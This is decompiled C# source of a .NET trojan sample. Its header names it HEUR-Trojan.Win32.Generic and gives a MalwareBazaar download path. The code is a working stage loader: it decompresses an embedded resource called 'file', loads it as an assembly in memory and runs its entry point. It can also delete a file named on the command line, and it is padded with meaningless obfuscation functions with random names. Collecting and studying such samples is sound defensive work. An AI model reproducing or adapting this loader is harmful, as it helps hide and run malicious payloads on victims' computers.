// Decompiled with JetBrains decompiler
// Type: JeyzHKqayP
// Assembly: tmp2E40.tmp, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 8EEE8E37-EB17-405E-9B11-34066CAFB67D
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.02-msil\HEUR-Trojan.Win32.Generic-76851a57710cb206de65e017f3e988a3d2970667a297a6b3068a22fc12b9dc81.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.IO;
using System.IO.Compression;
using System.Reflection;
using System.Resources;

[StandardModule]
public sealed class JeyzHKqayP
{
  public static string OjTrr00(string YFqEV0, string WMjKk0, string RvHbC0)
  {
    string[] strArray1 = new string[5]
    {
      "OjTrr0",
      nameof (YFqEV0),
      nameof (WMjKk0),
      nameof (RvHbC0),
      "YHCKr0"
    };
    string[] strArray2 = strArray1;
    int index = 0;
    if (index >= strArray2.Length)
    {
      string str;
      return str;
    }
    string str1 = strArray2[index];
    while (Operators.CompareString(strArray1[0], YFqEV0, false) != 0)
    {
      WMjKk0 = RvHbC0 + YFqEV0;
      if (RvHbC0.Contains(strArray1[2]))
      {
        str1 = Conversions.ToString(checked (RvHbC0.Length - 1));
        while (WMjKk0.Length == 2)
        {
          if (YFqEV0.Contains(strArray1[1]))
            return YFqEV0;
        }
      }
    }
    return YFqEV0;
  }

  public static string nzBMU11(string DyfeO1, string TTRIl1, string nIBbv1)
  {
    string[] strArray1 = new string[5]
    {
      "nzBMU1",
      nameof (DyfeO1),
      nameof (TTRIl1),
      nameof (nIBbv1),
      "FRUbV1"
    };
    string[] strArray2 = strArray1;
    int index = 0;
    if (index >= strArray2.Length)
    {
      string str;
      return str;
    }
    string str1 = strArray2[index];
    while (Operators.CompareString(strArray1[0], DyfeO1, false) != 0)
    {
      TTRIl1 = nIBbv1 + DyfeO1;
      if (nIBbv1.Contains(strArray1[2]))
      {
        str1 = Conversions.ToString(checked (nIBbv1.Length - 1));
        while (TTRIl1.Length == 2)
        {
          if (DyfeO1.Contains(strArray1[1]))
            return DyfeO1;
        }
      }
    }
    return DyfeO1;
  }

  [STAThread]
  public static void Main(string[] args)
  {
    if (args.Length <= 0)
    {
      rHjFMfCdNe.nXlaulANzi();
    }
    else
    {
      try
      {
        File.Delete(args[0]);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }
    Assembly.Load(JeyzHKqayP.Deflate_D((byte[]) new ResourceManager("zCom", Assembly.GetExecutingAssembly()).GetObject("file"))).EntryPoint.Invoke((object) null, (object[]) null);
  }

  public static byte[] Deflate_D(byte[] DataZ)
  {
    byte[] numArray;
    try
    {
      numArray = JeyzHKqayP.getStreamBytesX((Stream) new DeflateStream((Stream) new MemoryStream(DataZ), CompressionMode.Decompress, true), DataZ.Length);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      numArray = (byte[]) null;
      ProjectData.ClearProjectError();
    }
    return numArray;
  }

  public static byte[] getStreamBytesX(Stream dataStr, int dataChunks)
  {
    int offset = 0;
    byte[] streamBytesX;
    try
    {
      byte[] numArray;
      while (true)
      {
        numArray = (byte[]) Utils.CopyArray((Array) numArray, (Array) new byte[checked (offset + dataChunks + 1)]);
        int num = dataStr.Read(numArray, offset, dataChunks);
        if (num != 0)
          checked { offset += num; }
        else
          break;
      }
      streamBytesX = (byte[]) Utils.CopyArray((Array) numArray, (Array) new byte[checked (offset - 1 + 1)]);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      streamBytesX = (byte[]) null;
      ProjectData.ClearProjectError();
    }
    return streamBytesX;
  }

  public static string ZPmGN00(string IIzxC0, string tjLdK0, string hOZOY0)
  {
    string[] strArray1 = new string[5]
    {
      "ZPmGN0",
      nameof (IIzxC0),
      nameof (tjLdK0),
      nameof (hOZOY0),
      "nKGsC0"
    };
    string[] strArray2 = strArray1;
    int index = 0;
    if (index >= strArray2.Length)
    {
      string str;
      return str;
    }
    string str1 = strArray2[index];
    while (Operators.CompareString(strArray1[0], IIzxC0, false) != 0)
    {
      tjLdK0 = hOZOY0 + IIzxC0;
      if (hOZOY0.Contains(strArray1[2]))
      {
        str1 = Conversions.ToString(checked (hOZOY0.Length - 1));
        while (tjLdK0.Length == 2)
        {
          if (IIzxC0.Contains(strArray1[1]))
            return IIzxC0;
        }
      }
    }
    return IIzxC0;
  }

  public static string SuokH11(string vMhVe1, string cTlNX1, string XZNPE1)
  {
    string[] strArray1 = new string[5]
    {
      "SuokH1",
      nameof (vMhVe1),
      nameof (cTlNX1),
      nameof (XZNPE1),
      "PfGmJ1"
    };
    string[] strArray2 = strArray1;
    int index = 0;
    if (index >= strArray2.Length)
    {
      string str;
      return str;
    }
    string str1 = strArray2[index];
    while (Operators.CompareString(strArray1[0], vMhVe1, false) != 0)
    {
      cTlNX1 = XZNPE1 + vMhVe1;
      if (XZNPE1.Contains(strArray1[2]))
      {
        str1 = Conversions.ToString(checked (XZNPE1.Length - 1));
        while (cTlNX1.Length == 2)
        {
          if (vMhVe1.Contains(strArray1[1]))
            return vMhVe1;
        }
      }
    }
    return vMhVe1;
  }
}
